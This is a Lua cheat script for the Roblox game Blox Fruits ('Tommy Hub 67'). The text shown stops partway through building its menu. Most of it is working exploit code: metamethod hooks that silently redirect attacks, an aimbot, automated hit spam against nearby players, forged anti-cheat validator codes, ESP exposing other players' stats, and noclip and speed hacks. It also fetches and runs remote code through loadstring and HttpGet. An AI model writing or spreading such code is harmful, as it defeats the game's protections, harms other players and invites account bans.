--==============================================================
-- TOMMY HUB 67  |  WindUI Edition
-- Combat · Glitches · Soru · ESP · Dungeons · Aimbot 67
-- TikTok: @accountxz
--==============================================================

--==================== SERVICIOS ====================
local Players      = game:GetService("Players")
local RunService   = game:GetService("RunService")
local UIS          = game:GetService("UserInputService")
local RS           = game:GetService("ReplicatedStorage")
local player       = Players.LocalPlayer
local camera       = workspace.CurrentCamera
local mouse        = player:GetMouse()
local VIM; pcall(function() VIM = game:GetService("VirtualInputManager") end)

local env = (getgenv and getgenv()) or _G
if env.TommyHub67 then pcall(env.TommyHub67) end

local conns, alive = {}, true
local function track(c) table.insert(conns, c) return c end

--==================== ESTADO ====================
local S = {
    SkillAimbot=false, DragonM1=false, TargetPlayers=true, TargetMobs=false,
    TeamCheck=false, PvPCheck=true, SafeZoneCheck=true, MaxDist=2500, Rainbow=false,
    A67_Enabled=false, A67_Prediction=0.15, A67_MaxDist=1500,
    A67_TargetNPC=true, A67_TargetPlayer=false, A67_ShowMarker=true,
    FastAttack=false, AntiStun=false, WalkSpeed=false, Speed=50,
    Dash=false, DashLen=50, Noclip=false, WaterWalk=false, AutoV4=false,
    SangNoCD=false, SangAuto=false, SangDrop=2, NoAnim=false, JumpPower=500,
    SoulGuitar=false, SoulDash=121, AntiLava=false, DelShip=false, SuperJump=false,
    InfSoru=false, SoruAimbot=false, SoruTarget="Nearest", SoruDist=1000,
    PortalSoru=false, PortalSoruDelay=0.35,
    PortalSangC=false, PortalSangCDelay=0.35, PortalSangCTrigger="PortalF",
    FlashCombo=false, FlashWeapon="Fruit", FlashKey="Z", FlashDelay=0.3,
    ESP=false, ESPName=true, ESPLevel=true, ESPBounty=true, ESPFruit=true,
    ESPDist=true, ESPHP=true, ESPHighlight=false, ESPSize=12,
    AutoDungeon=false, DungeonWeapon="Sword", DungeonHeight=40, DungeonV4=false,
}
local Blacklist = {}

--==================== HELPERS ====================
local function getHRP() local c = player.Character return c and c:FindFirstChild("HumanoidRootPart") end
local function getHum() local c = player.Character return c and c:FindFirstChildOfClass("Humanoid") end
local function pressKey(kc, hold)
    if not VIM or not kc then return end
    VIM:SendKeyEvent(true, kc, false, game); task.wait(hold or 0.05); VIM:SendKeyEvent(false, kc, false, game)
end
local SLOT_KEYS = {Enum.KeyCode.One, Enum.KeyCode.Two, Enum.KeyCode.Three, Enum.KeyCode.Four}
local ATTACK_KW = {"attack","slash","punch","m1","combo","hit","tool","ability","skill","bullet","gun","sword","melee","fruit"}
local function isAttackAnim(track)
    local n = string.lower(track.Name)
    for _, kw in ipairs(ATTACK_KW) do if string.find(n, kw) then return true end end
    return track.Priority == Enum.AnimationPriority.Action
end
local function stopNonAttackAnims()
    local h = getHum(); local a = h and h:FindFirstChildOfClass("Animator")
    if not a then return end
    for _, t in pairs(a:GetPlayingAnimationTracks()) do
        if not isAttackAnim(t) then t:Stop(0) end
    end
end

--==================== TARGETING ====================
local function pvpOn(p) return p:GetAttribute("PvpDisabled") ~= true end
local function inSafeZone(p)
    local ok, res = pcall(function()
        local c = p.Character; local r = c and c:FindFirstChild("HumanoidRootPart")
        local wo = workspace:FindFirstChild("_WorldOrigin")
        if not (r and wo) then return false end
        local sz = wo:FindFirstChild("SafeZones")
        if sz then
            for _, z in pairs(sz:GetChildren()) do
                local m = z:FindFirstChild("Mesh")
                if m and m:IsA("SpecialMesh") then
                    if (z.Position - r.Position).Magnitude <= (z.Size.X * m.Scale.X) / 2 then return true end
                end
            end
        end
        return false
    end)
    return ok and res
end
local function isEnemy(p)
    if p == player then return false end
    if S.TeamCheck and p.Team and player.Team and p.Team.Name == "Marines" and player.Team.Name == "Marines" then return false end
    return true
end

local function closestPlayerChar(maxDist)
    local me = getHRP(); if not me then return nil end
    local best, bd = nil, maxDist or math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player and not Blacklist[p.Name] and pvpOn(p) and p.Character then
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            local h = p.Character:FindFirstChildOfClass("Humanoid")
            if r and h and h.Health > 0 then
                local d = (r.Position - me.Position).Magnitude
                if d < bd then bd = d; best = p.Character end
            end
        end
    end
    return best
end

local currentTarget = nil
local function getAimbotTarget()
    local me = getHRP(); if not me then return nil end
    local best, bd = nil, S.MaxDist
    local function check(c)
        if not c or c == player.Character then return end
        local p = Players:GetPlayerFromCharacter(c)
        if p then
            if Blacklist[p.Name] or not isEnemy(p) then return end
            if S.PvPCheck and not pvpOn(p) then return end
            if S.SafeZoneCheck and inSafeZone(p) then return end
        end
        local h = c:FindFirstChildOfClass("Humanoid")
        local part = c:FindFirstChild("HumanoidRootPart")
        if h and h.Health > 0 and part then
            local d = (part.Position - me.Position).Magnitude
            if d < bd then bd = d; best = part end
        end
    end
    if S.TargetPlayers then for _, p in ipairs(Players:GetPlayers()) do if p ~= player then check(p.Character) end end end
    if S.TargetMobs then
        local en = workspace:FindFirstChild("Enemies")
        if en then for _, e in ipairs(en:GetChildren()) do check(e) end end
    end
    return best
end

local function soruTargetPart()
    local name = S.SoruTarget
    local c
    if name == "Nearest" then c = closestPlayerChar(S.SoruDist)
    else local p = Players:FindFirstChild(name); c = p and p.Character end
    return c and c:FindFirstChild("HumanoidRootPart")
end

--==================== SILENT AIM (HOOKS) ====================
if hookmetamethod and newcclosure and checkcaller and getnamecallmethod then
    pcall(function()
        local oldNC
        oldNC = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
            if alive and S.SkillAimbot and currentTarget and not checkcaller() then
                local m = getnamecallmethod()
                if m == "FireServer" or m == "InvokeServer" then
                    local args = table.pack(...)
                    local changed = false
                    for i = 1, args.n do
                        local a = args[i]
                        if typeof(a) == "Vector3" then args[i] = currentTarget.Position; changed = true
                        elseif typeof(a) == "CFrame" then args[i] = CFrame.new(currentTarget.Position); changed = true end
                    end
                    if changed then return oldNC(self, table.unpack(args, 1, args.n)) end
                end
            end
            return oldNC(self, ...)
        end))
        local oldIdx
        oldIdx = hookmetamethod(game, "__index", newcclosure(function(self, k)
            if alive and self == mouse and (k == "Hit" or k == "Target") and not checkcaller() then
                if S.SoruAimbot then
                    local t = soruTargetPart()
                    local me = getHRP()
                    if t and me and (t.Position - me.Position).Magnitude <= S.SoruDist then
                        if k == "Hit" then return CFrame.new(t.Position) end
                        return t
                    end
                end
                if S.SkillAimbot and currentTarget then
                    if k == "Hit" then return CFrame.new(currentTarget.Position) end
                    return currentTarget
                end
            end
            return oldIdx(self, k)
        end))
    end)
end

local rainbowHL
track(RunService.RenderStepped:Connect(function()
    if S.SkillAimbot or S.Rainbow then currentTarget = getAimbotTarget() else currentTarget = nil end
    if S.Rainbow and currentTarget and currentTarget.Parent then
        local c = currentTarget.Parent
        if not rainbowHL or rainbowHL.Parent ~= c then
            if rainbowHL then rainbowHL:Destroy() end
            rainbowHL = Instance.new("Highlight")
            rainbowHL.Name = "TommyTargetHL"; rainbowHL.Adornee = c
            rainbowHL.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            rainbowHL.FillTransparency = 0.2; rainbowHL.Parent = c
        end
        local hue = (tick() * 0.7) % 1
        rainbowHL.FillColor = Color3.fromHSV(hue, 1, 1)
        rainbowHL.OutlineColor = Color3.fromHSV((hue + 0.25) % 1, 1, 1)
    elseif rainbowHL then rainbowHL:Destroy(); rainbowHL = nil end
end))

--==================== AIMBOT 67 DESCARADO ====================
local A67_marker = nil

local function A67_createMarker()
    if A67_marker and A67_marker.Parent then return A67_marker end
    local m = Instance.new("Part")
    m.Name = "TommyA67_Marker"; m.Shape = Enum.PartType.Ball
    m.Size = Vector3.new(1, 1, 1); m.Material = Enum.Material.Neon
    m.Color = Color3.fromRGB(255, 60, 60); m.Anchored = true
    m.CanCollide = false; m.CanQuery = false; m.CanTouch = false
    m.Transparency = 1; m.Parent = workspace
    A67_marker = m
    return m
end

local function A67_findNPC()
    local me = getHRP(); if not me then return nil end
    local best, bd = nil, S.A67_MaxDist
    local en = workspace:FindFirstChild("Enemies")
    if en then
        for _, m in ipairs(en:GetChildren()) do
            if m:IsA("Model") and m ~= player.Character then
                local h = m:FindFirstChildOfClass("Humanoid")
                local r = m:FindFirstChild("HumanoidRootPart")
                if h and r and h.Health > 0 then
                    local d = (r.Position - me.Position).Magnitude
                    if d < bd then bd = d; best = m end
                end
            end
        end
    end
    return best
end

local function A67_findPlayer()
    local me = getHRP(); if not me then return nil end
    local best, bd = nil, S.A67_MaxDist
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player and p.Character then
            local r = p.Character:FindFirstChild("HumanoidRootPart")
            local h = p.Character:FindFirstChildOfClass("Humanoid")
            if r and h and h.Health > 0 then
                local d = (r.Position - me.Position).Magnitude
                if d < bd then bd = d; best = p.Character end
            end
        end
    end
    return best
end

track(RunService.RenderStepped:Connect(function()
    if not S.A67_Enabled then
        if A67_marker and A67_marker.Parent then A67_marker.Transparency = 1 end
        return
    end
    local targetChar = nil
    if S.A67_TargetNPC then targetChar = A67_findNPC() end
    if not targetChar and S.A67_TargetPlayer then targetChar = A67_findPlayer() end
    if not targetChar then
        if A67_marker and A67_marker.Parent then A67_marker.Transparency = 1 end
        return
    end
    local root = targetChar:FindFirstChild("HumanoidRootPart")
    local hum = targetChar:FindFirstChildOfClass("Humanoid")
    if not root or not hum or hum.Health <= 0 then
        if A67_marker and A67_marker.Parent then A67_marker.Transparency = 1 end
        return
    end
    local targetPos = root.Position
    if hum.WalkSpeed >= 5 then targetPos = root.Position + root.Velocity * S.A67_Prediction end
    camera.CFrame = camera.CFrame:Lerp(CFrame.lookAt(camera.CFrame.Position, targetPos), 0.4)
    if S.A67_ShowMarker then
        local m = A67_createMarker()
        m.Position = targetPos
        m.Transparency = 0.4
    elseif A67_marker and A67_marker.Parent then
        A67_marker.Transparency = 1
    end
end))

--==================== DRAGON GUN ====================
local ShootEvent, Validator2, ShootFunction
local V = {v26=12, v22=13, v25=14, v21=15, v23=16, v24=17, v27=18}
local getupval  = debug and (debug.getupvalue or getupvalue) or getupvalue
local setupval  = debug and (debug.setupvalue or setupvalue) or setupvalue
local getupvals = debug and (debug.getupvalues or getupvalues) or getupvalues

task.spawn(function()
    pcall(function()
        local net = RS:WaitForChild("Modules", 3):WaitForChild("Net", 3)
        ShootEvent = net:WaitForChild("RE/ShootGunEvent", 3)
        Validator2 = RS:WaitForChild("Remotes", 3):WaitForChild("Validator2", 3)
    end)
end)

local function nextValidator()
    if not ShootFunction then
        local ok, res = pcall(require, RS:WaitForChild("Controllers"):WaitForChild("CombatController"))
        if ok and type(res) == "table" and res.Attack then ShootFunction = getupval(res.Attack, 9) end
    end
    if not (ShootFunction and getupvals) then return 0, 0 end
    local up = getupvals(ShootFunction); if not up then return 0, 0 end
    if up[V.v21] ~= 727595 then
        for i, v in pairs(up) do
            if v == 727595 then
                local o = i - 15
                V.v21=i; V.v22=13+o; V.v23=16+o; V.v24=17+o; V.v26=12+o; V.v25=14+o; V.v27=18+o
                break
            end
        end
    end
    local v1,v2,v3,v4 = getupval(ShootFunction,V.v21), getupval(ShootFunction,V.v22), getupval(ShootFunction,V.v23), getupval(ShootFunction,V.v24)
    local v5,v6,v7 = getupval(ShootFunction,V.v25), getupval(ShootFunction,V.v26), getupval(ShootFunction,V.v27)
    if not (v1 and v2 and v3 and v4 and v5 and v6 and v7) then return 0, 0 end
    local v8 = v6 * v2
    local v9 = (v5 * v2 + v6 * v1) % v3
    v9 = (v9 * v3 + v8) % v4
    v5 = math.floor(v9 / v3); v6 = v9 - v5 * v3; v7 = v7 + 1
    setupval(ShootFunction, V.v25, v5); setupval(ShootFunction, V.v26, v6); setupval(ShootFunction, V.v27, v7)
    return math.floor(v9 / v4 * 16777215), v7
end

task.spawn(function()
    while alive do
        task.wait(0.085)
        if S.DragonM1 then pcall(function()
            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
            if not tool or tool.ToolTip ~= "Gun" then return end
            local best, bd = nil, math.huge
            local me = getHRP(); if not me then return end
            local function consider(c)
                local r = c and c:FindFirstChild("HumanoidRootPart"); local h = c and c:FindFirstChildOfClass("Humanoid")
                if r and h and h.Health > 0 then
                    local d = (r.Position - me.Position).Magnitude
                    if d < bd then bd = d; best = r end
                end
            end
            if S.TargetMobs then local en = workspace:FindFirstChild("Enemies"); if en then for _, e in ipairs(en:GetChildren()) do consider(e) end end end
            if S.TargetPlayers then for _, p in ipairs(Players:GetPlayers()) do if p ~= player then consider(p.Character) end end end
            if not best or not ShootEvent then return end
            local code, count = nextValidator()
            if code ~= 0 and Validator2 then Validator2:FireServer(code, count) end
            tool:SetAttribute("LocalOverheat", 0)
            tool:SetAttribute("LocalTotalShots", (tool:GetAttribute("LocalTotalShots") or 0) + 1)
            ShootEvent:FireServer(best.Position, {best})
        end) end
    end
end)

--==================== FAST ATTACK ====================
local RegisterHit, RegisterAttack
task.spawn(function()
    for _, v in pairs(RS:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            if v.Name == "RE/RegisterHit" then RegisterHit = v end
            if v.Name == "RE/RegisterAttack" then RegisterAttack = v end
        end
    end
end)
local fastRunning = false
local function startFastAttack()
    if fastRunning then return end
    fastRunning = true
    task.spawn(function()
        while alive and S.FastAttack do
            RunService.Stepped:Wait()
            local me = getHRP()
            if me and RegisterHit and RegisterAttack then
                local list = {}
                local function add(c)
                    local h = c and c:FindFirstChildOfClass("Humanoid"); local r = c and c:FindFirstChild("HumanoidRootPart"); local hd = c and c:FindFirstChild("Head")
                    if h and r and hd and h.Health > 0 and (r.Position - me.Position).Magnitude <= 2500 then table.insert(list, {c, hd}) end
                end
                for _, p in ipairs(Players:GetPlayers()) do if p ~= player and not Blacklist[p.Name] then add(p.Character) end end
                local en = workspace:FindFirstChild("Enemies")
                if en then for _, n in ipairs(en:GetChildren()) do add(n) end end
                if #list > 0 then
                    pcall(function() RegisterAttack:FireServer(0); RegisterHit:FireServer(list[1][2], list) end)
                end
            end
        end
        fastRunning = false
    end)
end

--==================== ANTI STUN ====================
local asConns = {}
local function setAntiStun(on)
    S.AntiStun = on
    for _, c in pairs(asConns) do c:Disconnect() end
    asConns = {}
    if on then
        table.insert(asConns, RunService.Heartbeat:Connect(function()
            pcall(function()
                local c = player.Character; if not c then return end
                c:SetAttribute("AllCooldown", 0); c:SetAttribute("FlashstepCooldown", 1)
                c:SetAttribute("UsingSkill", false); c:SetAttribute("isUsingSkill", false); c:SetAttribute("Busy", false)
                local h, r = c:FindFirstChildOfClass("Humanoid"), c:FindFirstChild("HumanoidRootPart")
                if h and h.WalkSpeed < 16 then h.WalkSpeed = 16 end
                if r then for _, v in ipairs(r:GetChildren()) do if v:IsA("BodyVelocity") or v:IsA("BodyPosition") then v:Destroy() end end end
            end)
        end))
    end
end

--==================== MOVIMIENTO ====================
track(RunService.Heartbeat:Connect(function(dt)
    if not S.WalkSpeed then return end
    local c = player.Character
    local h = c and c:FindFirstChildOfClass("Humanoid")
    local r = c and c:FindFirstChild("HumanoidRootPart")
    if not (h and r) or h.Health <= 0 or h.Sit then return end
    local dir = h.MoveDirection
    local extra = S.Speed - h.WalkSpeed
    if dir.Magnitude > 0 and extra > 0 then r.CFrame = r.CFrame + dir * extra * dt end
end))

track(RunService.Stepped:Connect(function()
    local c = player.Character; if not c then return end
    if S.Noclip then
        for _, p in pairs(c:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end
    end
end))

local function applyDash(len)
    pcall(function()
        local c = player.Character
        if c then c:SetAttribute("DashLength", len); c:SetAttribute("DashLengthAir", len) end
    end)
end

task.spawn(function()
    local wp
    while alive do
        task.wait(0.15)
        if S.WaterWalk then
            if not (wp and wp.Parent) then
                wp = Instance.new("Part"); wp.Size = Vector3.new(200,1,200); wp.Transparency = 1
                wp.Anchored = true; wp.CanCollide = false; wp.Name = "TommyWater"; wp.Parent = workspace
            end
            local r = getHRP()
            if r and r.Position.Y >= 9.5 then wp.Position = Vector3.new(r.Position.X, 9.2, r.Position.Z); wp.CanCollide = true
            else wp.CanCollide = false end
        elseif wp then wp:Destroy(); wp = nil end
    end
end)

task.spawn(function()
    while alive do
        task.wait(0.5)
        if S.AutoV4 then pcall(function()
            local c = player.Character
            local e = c and c:GetAttribute("RaceEnergy")
            if e and e >= 100 then
                local awk = player.Backpack:FindFirstChild("Awakening") or c:FindFirstChild("Awakening")
                if awk and awk:FindFirstChild("RemoteFunction") then awk.RemoteFunction:InvokeServer(true)
                else
                    local rem = RS:FindFirstChild("Remotes")
                    if rem and rem:FindFirstChild("CommF_") then rem.CommF_:InvokeServer("Awakening", true) end
                end
            end
        end) end
    end
end)

--==================== SANGUINE ====================
local lagBusy = false
local function lagFor(dur)
    if lagBusy then return end
    lagBusy = true
    local stop, interval = tick() + dur, 1 / 20
    local con
    con = RunService.RenderStepped:Connect(function()
        if tick() > stop then con:Disconnect(); lagBusy = false; return end
        local t0 = tick()
        while tick() - t0 < interval do end
    end)
end
local function pushForward(speed, life)
    local r = getHRP(); if not r then return end
    local att = Instance.new("Attachment", r)
    local lv = Instance.new("LinearVelocity")
    lv.MaxForce = math.huge; lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
    lv.VectorVelocity = camera.CFrame.LookVector * speed; lv.Attachment0 = att; lv.Parent = r
    task.delay(life, function() if lv then lv:Destroy() end if att then att:Destroy() end end)
end
local function sangManual() lagFor(0.43); pushForward(400, 0.9) end

local sangConn, sangCD = nil, false
local function startSangAuto()
    if sangConn then sangConn:Disconnect(); sangConn = nil end
    local h = getHum(); if not h then return end
    sangConn = h.AnimationPlayed:Connect(function(t)
        if not S.SangAuto or sangCD then return end
        local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
        if not tool or not (string.find(string.lower(tool.Name), "sanguine") or string.find(string.lower(tool.Name), "art")) then return end
        local id = tostring(t.Animation and t.Animation.AnimationId or "")
        if id:find("14586872029") or id:find("14418367908") or id:find("14418370048") then
            sangCD = true
            lagFor(S.SangDrop); pushForward(400, 0.9)
            task.delay(S.SangDrop + 0.5, function() sangCD = false end)
        end
    end)
end
track(player.CharacterAdded:Connect(function() task.wait(0.5); if S.SangAuto then startSangAuto() end end))

--==================== NO ANIMS / SUPER JUMP ====================
track(RunService.Stepped:Connect(function()
    if not S.NoAnim then return end
    local h = getHum(); if h then h.AutoRotate = true end
    stopNonAttackAnims()
end))

local function superJump()
    local r, h = getHRP(), getHum()
    if not r or not h or h.Health <= 0 then return end
    stopNonAttackAnims()
    r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, S.JumpPower, r.AssemblyLinearVelocity.Z)
    h:ChangeState(Enum.HumanoidStateType.Jumping)
end
local lastJump = 0
track(UIS.JumpRequest:Connect(function()
    if S.SuperJump and tick() - lastJump > 0.35 then
        lastJump = tick(); superJump()
    end
end))

--==================== SOUL GUITAR ====================
local guitarBusy = false
local function soulGuitarJump()
    if guitarBusy then return end
    local c = player.Character; local r, h = getHRP(), getHum()
    if not (c and r and h) then return end
    local tool = c:FindFirstChild("Skull Guitar") or player.Backpack:FindFirstChild("Skull Guitar")
    if not tool then return end
    guitarBusy = true
    if tool.Parent == player.Backpack then h:EquipTool(tool); task.wait(0.15) end
    pcall(function()
        local eq = tool:FindFirstChild("EquipEvent"); if eq then eq:FireServer(true) end
        local rem = RS:FindFirstChild("Remotes")
        local val = rem and rem:FindFirstChild("Validator2"); if val then val:FireServer(15627583, 1) end
        local re = tool:FindFirstChild("RemoteEvent"); if re then re:FireServer("TAP", mouse.Hit.Position) end
    end)
    stopNonAttackAnims()
    local look = r.CFrame.LookVector
    local flat = Vector3.new(look.X, 0, look.Z)
    if flat.Magnitude > 0 then flat = flat.Unit end
    local att = Instance.new("Attachment", r)
    local lv = Instance.new("LinearVelocity")
    lv.MaxForce = math.huge; lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
    lv.VectorVelocity = Vector3.new(flat.X * 180, 80, flat.Z * 180); lv.Attachment0 = att; lv.Parent = r
    h:ChangeState(Enum.HumanoidStateType.Jumping)
    task.delay(0.7, function() if lv then lv:Destroy() end if att then att:Destroy() end end)
    task.wait(0.6); guitarBusy = false
end
track(UIS.InputBegan:Connect(function(i, gp)
    if gp then return end
    if i.UserInputType == Enum.UserInputType.MouseButton1 and S.SoulGuitar then soulGuitarJump() end
end))

--==================== ANTI LAVA / DEL SHIP ====================
track(RunService.Stepped:Connect(function()
    if not S.AntiLava then return end
    local c = player.Character; if not c then return end
    for _, p in pairs(c:GetDescendants()) do
        if p:IsA("BasePart") and not ({HumanoidRootPart=1, Torso=1, UpperTorso=1, LowerTorso=1, Head=1})[p.Name] then p.CanTouch = false end
    end
end))

task.spawn(function()
    local ships = {"CursedShip", "Cursed Ship", "Ship"}
    local ext = {"Wall","Floor","Ceiling","Base","Hull","Window","DoorFrame"}
    while alive do
        task.wait(3)
        if S.DelShip then pcall(function()
            for _, o in pairs(workspace:GetDescendants()) do
                for _, sn in pairs(ships) do
                    if o.Name:find(sn) and (o:IsA("Model") or o:IsA("Folder")) then
                        for _, ch in pairs(o:GetDescendants()) do
                            if ch:IsA("BasePart") and not ch.Parent:FindFirstChild("Humanoid") then
                                local keep = false
                                for _, e in pairs(ext) do if ch.Name:find(e) then keep = true break end end
                                if not keep then ch:Destroy() end
                            end
                        end
                    end
                end
            end
        end) end
    end
end)

--==================== SORU ====================
local function attachInfSoru(c)
    if not c then return end
    if S.InfSoru then c:SetAttribute("FlashstepCooldown", 1) end
    track(c.AttributeChanged:Connect(function(a)
        if a == "FlashstepCooldown" and S.InfSoru and c:GetAttribute(a) ~= 1 then c:SetAttribute(a, 1) end
    end))
end
track(player.CharacterAdded:Connect(attachInfSoru))
if player.Character then attachInfSoru(player.Character) end
task.spawn(function()
    while alive do
        task.wait(0.5)
        if S.InfSoru and player.Character then pcall(function() player.Character:SetAttribute("FlashstepCooldown", 1) end) end
    end
end)

local FLASH_NAMES = {"flashstepregular","flashstepdraco","flashstep","soru"}
local FLASH_IDS = {"17555632156","18461649274","616006778","616010882","5403485593","5403491911"}
local function isFlashstep(t)
    local n = string.lower(t.Name)
    for _, f in ipairs(FLASH_NAMES) do if string.find(n, f) then return true end end
    local id = t.Animation and t.Animation.AnimationId:match("%d+") or ""
    for _, f in ipairs(FLASH_IDS) do if id == f then return true end end
    return false
end
local function holdingPortal()
    local t = player.Character and player.Character:FindFirstChildOfClass("Tool")
    if not t then return false end
    local n = string.lower(t.Name)
    return string.find(n, "portal") or string.find(n, "door")
end
local function equipByName(...)
    local h = getHum(); if not h then return end
    local bp = player:FindFirstChild("Backpack"); if not bp then return end
    for _, t in ipairs(bp:GetChildren()) do
        local n = string.lower(t.Name)
        for _, kw in ipairs({...}) do
            if string.find(n, kw) then h:EquipTool(t); task.wait(0.1); return t end
        end
    end
end
local function portalCombo()
    if not holdingPortal() then equipByName("portal", "door"); task.wait(0.08) end
    if not holdingPortal() then return end
    task.wait(S.PortalSoruDelay)
    pressKey(Enum.KeyCode.X); task.wait(0.15); pressKey(Enum.KeyCode.Z)
end
local function portalSangC()
    task.wait(S.PortalSangCDelay)
    equipByName("sanguine"); task.wait(0.1)
    pressKey(Enum.KeyCode.C, 0.15)
end
local function flashCombo()
    task.wait(S.FlashDelay)
    if not S.FlashCombo then return end
    local slot = ({Melee=1, Fruit=2, Sword=3, Gun=4})[S.FlashWeapon] or 2
    pressKey(SLOT_KEYS[slot], 0.06); task.wait(0.12)
    local kc = Enum.KeyCode[S.FlashKey]; if kc then pressKey(kc, 0.06) end
end
local function monitorChar(c)
    local h = c:WaitForChild("Humanoid", 5); if not h then return end
    track(h.AnimationPlayed:Connect(function(t)
        local n = string.lower(t.Name)
        local isPortalF = n:find("portal") or n:find("teleport") or n:find("warp") or n:find("door") or n:find("world")
        local isSoru = isFlashstep(t)
        if S.PortalSoru and isSoru then task.spawn(portalCombo) end
        if S.PortalSangC and ((S.PortalSangCTrigger == "PortalF" and isPortalF) or (S.PortalSangCTrigger == "Soru" and isSoru)) then
            task.spawn(portalSangC)
        end
        if S.FlashCombo and isSoru then task.spawn(flashCombo) end
    end))
end
track(player.CharacterAdded:Connect(monitorChar))
if player.Character then monitorChar(player.Character) end

--==================== ESP ====================
local esp, cache = {}, {}
local function clearESP(p)
    local d = esp[p]
    if d then pcall(function() d.gui:Destroy() if d.hl then d.hl:Destroy() end end) esp[p] = nil end
end
local function pdata(p)
    local d = cache[p]
    if not d then d = {level="?", fruit="None", bounty=0, t=0}; cache[p] = d end
    if tick() - d.t > 5 then
        pcall(function() d.level = p.Data.Level.Value end)
        pcall(function() d.fruit = p.Data.DevilFruit.Value end)
        pcall(function() d.bounty = p.leaderstats["Bounty/Honor"].Value end)
        d.t = tick()
    end
    return d
end
local function updateESP()
    local me = getHRP()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player then
            local c = p.Character
            local head = c and c:FindFirstChild("Head")
            local h = c and c:FindFirstChildOfClass("Humanoid")
            local r = c and c:FindFirstChild("HumanoidRootPart")
            if S.ESP and head and h and r and me then
                local d = esp[p]
                if not d or d.char ~= c or not d.gui.Parent then
                    clearESP(p)
                    local bb = Instance.new("BillboardGui")
                    bb.Adornee = head; bb.Size = UDim2.new(0,200,0,75); bb.StudsOffset = Vector3.new(0,3,0); bb.AlwaysOnTop = true; bb.Parent = head
                    local t = Instance.new("TextLabel", bb)
                    t.Size = UDim2.new(1,0,1,0); t.BackgroundTransparency = 1; t.RichText = true
                    t.Font = Enum.Font.SourceSansBold; t.TextStrokeTransparency = 0
                    d = {gui=bb, label=t, char=c}; esp[p] = d
                end
                local pd = pdata(p)
                local marine = p.Team and p.Team.Name == "Marines"
                d.label.TextColor3 = marine and Color3.fromRGB(0,170,255) or Color3.fromRGB(255,70,70)
                d.label.TextSize = S.ESPSize
                local parts = {}
                if S.ESPName then parts[#parts+1] = "[" .. (marine and "Marines" or "Pirates") .. "] <font color=\"rgb(255,255,0)\">" .. p.Name .. "</font>" end
                if S.ESPLevel then parts[#parts+1] = " [Lv." .. tostring(pd.level) .. "]" end
                if S.ESPBounty then
                    local off = p:GetAttribute("PvpDisabled") == true
                    local bm = type(pd.bounty) == "number" and math.floor(pd.bounty / 1000000) or 0
                    parts[#parts+1] = "\n" .. (off and "🟢 PvP OFF" or "🔴 PvP ON") .. " | Bounty: " .. bm .. "M\n"
                end
                if S.ESPFruit then parts[#parts+1] = "Fruit: " .. tostring(pd.fruit) .. "\n" end
                if S.ESPDist then parts[#parts+1] = math.floor((r.Position - me.Position).Magnitude) .. "m | " end
                if S.ESPHP then parts[#parts+1] = "HP " .. math.floor(h.Health / math.max(h.MaxHealth, 1) * 100) .. "%" end
                d.label.Text = table.concat(parts)
                if S.ESPHighlight then
                    if not d.hl or not d.hl.Parent then
                        local hl = Instance.new("Highlight")
                        hl.Name = "TommyESP"; hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        hl.FillColor = Color3.fromRGB(255,0,0); hl.OutlineColor = Color3.fromRGB(255,0,0)
                        hl.FillTransparency = 0.5; hl.Parent = c; d.hl = hl
                    end
                elseif d.hl then d.hl:Destroy(); d.hl = nil end
            else clearESP(p) end
        end
    end
end
task.spawn(function()
    while alive do pcall(updateESP); task.wait(0.15) end
end)
track(Players.PlayerRemoving:Connect(function(p) clearESP(p); cache[p] = nil end))

--==================== DUNGEONS ====================
local dgJustDied, dgLast, dgGen = false, nil, 0
track(player.CharacterAdded:Connect(function() dgJustDied = true end))

local function dgMatch(tool)
    return tool.ToolTip == S.DungeonWeapon or string.find(string.lower(tool.Name), string.lower(S.DungeonWeapon)) ~= nil
end
local function dgEquip()
    local c, h = player.Character, getHum()
    if not (c and h) then return end
    local cur = c:FindFirstChildOfClass("Tool")
    if cur and dgMatch(cur) then return end
    local bp = player:FindFirstChild("Backpack")
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") and dgMatch(t) then h:EquipTool(t) return end
        end
    end
end
local function dgRun(gen)
    while alive and S.AutoDungeon and gen == dgGen do
        task.wait(1)
        pcall(dgEquip)
    end
end
local function dgSet(on)
    dgGen = dgGen + 1
    dgLast = nil; dgJustDied = false
    if not on then return end
    task.spawn(dgRun, dgGen)
end

--==============================================================
-- WINDUI INTERFAZ
--==============================================================
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
if not WindUI then warn("❌ No se pudo cargar WindUI") return end

local Window = WindUI:CreateWindow({
    Title = "Tommy Hub 67",
    Icon = "rbxassetid://10734950309",
    Author = "@accountxz  •  Blox Fruits",
    Folder = "TommyHub67",
    Size = UDim2.fromOffset(620, 460),
    Transparent = true,
    Theme = "Dark",
    User = { Enabled = true, Anonymous = true },
    SideBarWidth = 180,
    HasOutline = true,
})

Window:Notification({Title = "Tommy Hub 67", Content = "Script cargado correctamente", Duration = 5})

-- Helper para secciones siempre abiertas
local function Section(tab, title)
    local s
    pcall(function() s = tab:Section({Title = title, Opened = true}) end)
    if not s then pcall(function() s = tab:Section({Title = title, Collapsed = false}) end) end
    if not s then pcall(function() s = tab:Section(title) end) end
    return s
end

--==================== TAB: COMBAT ====================
local CombatTab = Window:Tab({Title = "Combat", Icon = "sword"})

local S1 = Section(CombatTab, "Silent Aim (Skills)")
S1:Toggle({Title = "Silent Aim (Skills)", Desc = "Redirige los remotes sin mover la cámara.", Default = false, Callback = function(state) S.SkillAimbot = state end})
S1:Toggle({Title = "Aimbot M1 (Dragon Gun) ⚠ BAN", Default = false, Callback = function(state) S.DragonM1 = state end})
S1:Toggle({Title = "Target Players", Default = true, Callback = function(state) S.TargetPlayers = state end})
S1:Toggle({Title = "Target NPCs", Default = false, Callback = function(state) S.TargetMobs = state end})
